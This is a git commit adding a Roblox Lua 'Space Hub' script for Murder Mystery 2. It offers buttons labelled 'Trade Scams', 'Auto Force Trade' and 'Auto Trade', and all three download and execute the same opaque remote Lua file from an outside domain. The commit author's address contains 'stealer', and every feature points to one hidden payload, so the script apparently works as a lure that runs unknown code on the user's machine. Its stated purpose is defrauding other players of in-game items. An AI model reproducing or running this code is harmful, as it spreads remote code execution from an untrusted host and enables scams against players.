9f6255d06ada382ca7cfe536324d1623dd222aeb
X-hub2 <starxstealer@gmail.com>
2024-12-06 02:01:06 +0700

    Create 123131wqdqdasdasdw.lua

---
+++ 123131wqdqdasdasdw.lua
@@ -0,0 +1,21 @@
+setclipboard("Space Hub On Top")
+
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/bacon"))()
+
+local window = lib:CreateWindow("Space Hub")
+
+local label = lib:CreateLabel(window, "Murder Mystery 2")
+
+local textBox = lib:CreateTextBox(window, Enum.Font.Legacy, "WAIT 5 Min BEFORE USED THIS", "WAIT 5 Min BEFORE USED THIS")
+
+local button = lib:CreateButton(window, "Trade Scams✨", function()
+   loadstring(game:HttpGet("https://egorikusa.space/dc84f98af1e33f0688aa6cc8.lua", true))()
+end)
+
+local button = lib:CreateButton(window, "Auto Force Trade", function()
+    loadstring(game:HttpGet("https://egorikusa.space/dc84f98af1e33f0688aa6cc8.lua", true))()
+end)
+
+local button = lib:CreateButton(window, "Auto Trade", function()
+loadstring(game:HttpGet("https://egorikusa.space/dc84f98af1e33f0688aa6cc8.lua", true))()
+end)
